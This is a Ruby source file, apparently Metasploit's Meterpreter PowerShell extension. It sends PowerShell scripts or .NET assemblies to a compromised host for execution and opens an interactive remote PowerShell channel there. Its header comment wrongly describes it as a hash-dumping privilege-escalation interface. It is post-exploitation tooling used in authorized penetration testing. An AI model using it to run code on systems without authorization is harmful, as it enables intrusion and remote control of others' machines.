# -*- coding: binary -*-

require 'rex/post/meterpreter/extensions/powershell/tlv'

module Rex
module Post
module Meterpreter
module Extensions
module Powershell

###
#
# This meterpreter extensions a privilege escalation interface that is capable
# of doing things like dumping password hashes and performing local
# exploitation.
#
###
class Powershell < Extension


  def initialize(client)
    super(client, 'powershell')

    client.register_extension_aliases(
      [
        {
          'name' => 'powershell',
          'ext'  => self
        },
      ])
  end


  def import_file(opts={})
    return nil unless opts[:file]

    # if it's a script, then we'll just use execute_string
    if opts[:file].end_with?('.ps1')
      opts[:code] = ::File.read(opts[:file])
      return execute_string(opts)
    end

    # if it's a dll (hopefully a .NET 2.0 one) then do something different
    if opts[:file].end_with?('.dll')
      # TODO: perhaps do some kind of check to see if the DLL is a .NET assembly?
      binary = ::File.read(opts[:file])

      request = Packet.create_request('powershell_assembly_load')
      request.add_tlv(TLV_TYPE_POWERSHELL_ASSEMBLY_SIZE, binary.length)
      request.add_tlv(TLV_TYPE_POWERSHELL_ASSEMBLY, binary)
      client.send_request(request)
      return true
    end

    return false
  end

  def execute_string(opts={})
    return nil unless opts[:code]

    request = Packet.create_request('powershell_execute')
    request.add_tlv(TLV_TYPE_POWERSHELL_CODE, opts[:code])
    request.add_tlv(TLV_TYPE_POWERSHELL_SESSIONID, opts[:session_id]) if opts[:session_id]

    response = client.send_request(request)
    return response.get_tlv_value(TLV_TYPE_POWERSHELL_RESULT)
  end

  def shell(opts={})
    request = Packet.create_request('powershell_shell')
    request.add_tlv(TLV_TYPE_POWERSHELL_SESSIONID, opts[:session_id]) if opts[:session_id]

    response = client.send_request(request)
    channel_id = response.get_tlv_value(TLV_TYPE_CHANNEL_ID)
    if channel_id.nil?
      raise Exception, "We did not get a channel back!"
    end
    Rex::Post::Meterpreter::Channels::Pools::StreamPool.new(client, channel_id, 'powershell_psh', CHANNEL_FLAG_SYNCHRONOUS)
  end

end

end; end; end; end; end
